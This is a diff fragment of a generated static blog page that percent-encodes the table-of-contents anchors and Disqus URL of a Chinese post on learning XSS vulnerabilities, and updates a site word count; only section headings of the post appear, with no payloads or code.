-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#任务标题：web安全之XSS漏洞学习实战"><span class="nav-number">1.</span> <span class="nav-text">任务标题：web安全之XSS漏洞学习实战</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#学习报告"><span class="nav-number">2.</span> <span class="nav-text">学习报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XSS简介"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 XSS简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-存储型XSS"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. 存储型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击流程"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例代码"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">实例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-反射性XSS"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. 反射性XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击流程-1"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例代码-1"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">实例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Dom型XSS"><span class="nav-number">2.1.3.</span> <span class="nav-text">3. Dom型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击流程-2"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例代码-2"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">实例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-常用的攻击载荷"><span class="nav-number">2.1.4.</span> <span class="nav-text">4.常用的攻击载荷</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-XSS实战"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 XSS实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-本地XSS平台搭建"><span class="nav-number">2.2.0.1.</span> <span class="nav-text">1. 本地XSS平台搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-利用XSS获取管理员的COOKIE"><span class="nav-number">2.2.0.2.</span> <span class="nav-text">2. 利用XSS获取管理员的COOKIE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-XSS危害与防御"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 XSS危害与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-XSS利用框架"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">1. XSS利用框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-XSS的危害"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">2. XSS的危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-XSS的防御"><span class="nav-number">2.3.0.3.</span> <span class="nav-text">3. XSS的防御</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-参考链接"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 参考链接</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E6%A0%87%E9%A2%98%EF%BC%9Aweb%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98"><span class="nav-number">1.</span> <span class="nav-text">任务标题：web安全之XSS漏洞学习实战</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A"><span class="nav-number">2.</span> <span class="nav-text">学习报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XSS%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 XSS简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. 存储型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">实例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%8D%E5%B0%84%E6%80%A7XSS"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. 反射性XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-1"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">实例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Dom%E5%9E%8BXSS"><span class="nav-number">2.1.3.</span> <span class="nav-text">3. Dom型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-2"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E4%BB%A3%E7%A0%81-2"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">实例代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%B8%B8%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="nav-number">2.1.4.</span> <span class="nav-text">4.常用的攻击载荷</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-XSS%E5%AE%9E%E6%88%98"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 XSS实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0XSS%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA"><span class="nav-number">2.2.0.1.</span> <span class="nav-text">1. 本地XSS平台搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8XSS%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84COOKIE"><span class="nav-number">2.2.0.2.</span> <span class="nav-text">2. 利用XSS获取管理员的COOKIE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-XSS%E5%8D%B1%E5%AE%B3%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 XSS危害与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-XSS%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">1. XSS利用框架</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-XSS%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">2. XSS的危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-XSS%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">2.3.0.3.</span> <span class="nav-text">3. XSS的防御</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 参考链接</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -839,7 +832,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">67.5k</span>
+    <span title="Site words total count">68k</span>
   
 </div>
 
@@ -977,7 +970,7 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2021/01/12/第十二周：XSS漏洞学习实战/';
+          this.page.url = 'http://yoursite.com/2021/01/12/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%91%A8%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/';
           this.page.identifier = '2021/01/12/第十二周：XSS漏洞学习实战/';
           this.page.title = '第十二周：XSS漏洞学习实战';
         };
